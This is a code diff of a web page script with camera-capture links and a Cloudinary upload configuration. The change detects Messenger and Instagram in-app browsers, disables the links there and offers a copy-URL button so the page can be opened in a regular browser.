@@ -4,12 +4,16 @@ const captureLinks = document.querySelectorAll('.link-box');
 const modal = document.getElementById('cameraModal');
 const retryButton = document.getElementById('retryCamera');
 const linkBoxes = document.querySelectorAll('.link-box');
-const browserModal = document.getElementById('browserModal');
-const closeBrowserModal = document.getElementById('closeBrowserModal');
 
 // Cloudinary configuration
 const cloudName = 'dsfc6qjqx';
 const uploadPreset = 'ml_default';
+
+// Add at the top of script.js
+const isMessenger = () => {
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  return ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram');
+};
 
 function showCameraModal() {
   modal.style.display = 'block';
@@ -104,18 +108,19 @@ captureLinks.forEach(link => {
   });
 });
 
-// Detect Messenger in-app browser
-function isMessengerBrowser() {
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  return (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1);
-}
-
-// Show browser modal if in Messenger
-if(isMessengerBrowser() && /android|webos|iphone|ipad|ipod/i.test(navigator.userAgent)) {
-  browserModal.style.display = 'block';
-}
-
-// Close modal handler
-closeBrowserModal.addEventListener('click', () => {
-  browserModal.style.display = 'none';
-}); 
+// Show messenger warning if needed
+if (isMessenger()) {
+  document.getElementById('messengerModal').style.display = 'block';
+  
+  // Disable all functionality
+  linkBoxes.forEach(link => {
+    link.style.pointerEvents = 'none';
+  });
+  
+  // Copy URL handler
+  document.getElementById('copyUrl').addEventListener('click', () => {
+    navigator.clipboard.writeText(window.location.href)
+      .then(() => alert('Link copied! Paste in browser'))
+      .catch(() => alert('Could not copy link'));
+  });
+} 
